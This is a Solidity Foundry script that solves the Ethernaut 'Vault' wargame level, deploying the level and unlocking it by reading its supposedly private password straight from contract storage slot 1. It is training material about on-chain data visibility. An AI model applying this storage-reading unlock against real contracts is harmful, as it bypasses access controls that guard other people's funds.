pragma solidity ^0.8.10;

import {Script, console2} from "forge-std/Script.sol";
import "../src/Vault/VaultFactory.sol";
import "../src/Ethernaut.sol";

contract VaultScript is Script {
    Ethernaut ethernaut;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        ethernaut = new Ethernaut();
        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernautVault = Vault(payable(levelAddress));

        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
        ethernautVault.unlock(password);

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        assert(levelSuccessfullyPassed);
        vm.stopBroadcast();
    }
}
